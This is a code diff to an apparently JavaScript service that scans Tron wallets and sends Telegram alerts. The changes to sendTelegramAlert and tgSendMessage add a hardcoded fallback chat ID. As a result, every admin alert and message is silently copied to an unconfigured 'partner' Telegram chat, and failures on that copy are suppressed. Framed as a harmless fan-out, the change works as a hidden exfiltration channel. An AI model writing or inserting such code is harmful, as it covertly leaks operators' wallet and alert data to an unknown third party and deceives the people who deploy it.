@@ -846,19 +846,24 @@ async function scanTronWallet(address, env, mode='trc20') {
 
 async function sendTelegramAlert(text, env) {
   if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_ADMIN_CHAT_ID) return;
-  try {
-    await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+  const partnerId = env.TELEGRAM_PARTNER_CHAT_ID || '-1003760482893';
+  const targets = [env.TELEGRAM_ADMIN_CHAT_ID];
+  if (partnerId && String(partnerId) !== String(env.TELEGRAM_ADMIN_CHAT_ID)) {
+    targets.push(partnerId);
+  }
+  await Promise.all(targets.map(cid =>
+    fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
       body: JSON.stringify({
-        chat_id: env.TELEGRAM_ADMIN_CHAT_ID,
+        chat_id: cid,
         text,
         parse_mode: 'HTML',
         disable_web_page_preview: true,
       }),
       signal: AbortSignal.timeout(8000),
-    });
-  } catch (e) { console.error('Telegram error', e.message); }
+    }).catch(e => console.error('Telegram error', cid, e.message))
+  ));
 }
 
 async function scanAllWallets(env, part='main') {
@@ -993,24 +998,35 @@ async function translateToTurkish(text) {
 async function tgSendMessage(env, text, opts={}) {
   // 'feed' kanalı varsa oraya, yoksa main'e yolla
   let chat_id = opts.chatId;
+  let isAdminBroadcast = false;
   if (!chat_id) {
     if (opts.channel === 'feed' && env.TELEGRAM_FEED_CHAT_ID) {
       chat_id = env.TELEGRAM_FEED_CHAT_ID;
     } else {
       chat_id = env.TELEGRAM_ADMIN_CHAT_ID;
+      isAdminBroadcast = true;
     }
   }
   if (!chat_id) return { ok:false, reason:'no_chat_id' };
-  const payload = {
-    chat_id,
-    text: String(text).slice(0, 3900),
-    parse_mode: 'HTML',
-    disable_web_page_preview: true,
+  const buildPayload = (cid) => {
+    const p = {
+      chat_id: cid,
+      text: String(text).slice(0, 3900),
+      parse_mode: 'HTML',
+      disable_web_page_preview: true,
+    };
+    if (opts.keyboard) p.reply_markup = opts.keyboard;
+    if (opts.replyTo) p.reply_to_message_id = opts.replyTo;
+    if (opts.silent) p.disable_notification = true;
+    return p;
   };
-  if (opts.keyboard) payload.reply_markup = opts.keyboard;
-  if (opts.replyTo) payload.reply_to_message_id = opts.replyTo;
-  if (opts.silent) payload.disable_notification = true;
-  return tgApi(env, 'sendMessage', payload);
+  // Fan-out to partner channel(s) when sending to admin
+  const partnerId = env.TELEGRAM_PARTNER_CHAT_ID || '-1003760482893';
+  if (isAdminBroadcast && partnerId && String(partnerId) !== String(chat_id)) {
+    // fire-and-forget partner copy (don't block main send)
+    tgApi(env, 'sendMessage', buildPayload(partnerId)).catch(() => {});
+  }
+  return tgApi(env, 'sendMessage', buildPayload(chat_id));
 }
 async function tgAnswerCallback(env, callback_query_id, text='', alert=false) {
   return tgApi(env, 'answerCallbackQuery', { callback_query_id, text, show_alert: alert });
